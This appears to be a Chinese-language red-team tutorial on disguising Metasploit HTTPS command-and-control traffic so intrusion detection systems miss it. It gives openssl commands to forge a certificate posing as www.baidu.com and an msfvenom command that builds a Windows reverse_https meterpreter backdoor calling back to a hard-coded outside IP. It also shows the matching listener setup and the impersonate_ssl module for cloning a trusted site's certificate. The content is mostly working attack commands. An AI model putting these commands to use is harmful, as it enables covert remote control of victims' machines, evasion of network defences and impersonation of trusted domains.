
如果我们采用MSFhttps协议上线控制

默认不修改采用MSF自带的证书进行上线
（流量设备IDS 如果有这类策略直接就能知道是MSF控制流量，如ja3,ja3s特征）
```
默认证书访问https://:监听端口，浏览器证书显示：
公用名（CN）lowe.sons.io
组织（0）Lowe and Sons
组织单位（OU）override
公用名（CN）lowe.sons.io
组织（O）Lowe and Sons
组织单位（Ou）override
```

## **更换证书**
1.利用 openssl程序 生成证书：
```
openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 -subj 
"/C=UK/ST=xiaodi/L=xiaodi/O=Development/CN=www.baidu.com" -keyout 
www.baidu.com.key -out www.baidu.com.crt && cat www.baidu.com.key 
www.baidu.com.crt > www.baidu.com.pem && rm -f www.baidu.com.key 
www.baidu.com.crt
```
2.MSF 生成绑定证书后门：
```
msfvenom -p windows/meterpreter/reverse_https LHOST=47.94.236.117 
LPORT=5566 PayloadUUIDTracking=true PayloadUUIDName=Whoamishell 
HandlerSSLCert=/root/www.baidu.com.pem StagerVerifySSLCert=true -
f exe -o https-b.exe
```
3.MSF 监听上线：
```
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 5566
set HandlerSSLCert /root/www.baidu.com.pem
set StagerVerifySSLCert true
run
```
此时浏览器https://
```
公用名（CN）www.baidu.com
组织(0)Development
```

^
4.利用msf的impersonate_ssl 模块
此外 Metasploit 框架还有一个 auxiliary/gather/impersonate_ssl 模块，可
以用来自动从信任源创建一个虚假证书.pem，十分方便：
```
use auxiliary/gather/impersonate_ssl 
set RHOST www.baidu.com
run
显示输出.pem文件位置
```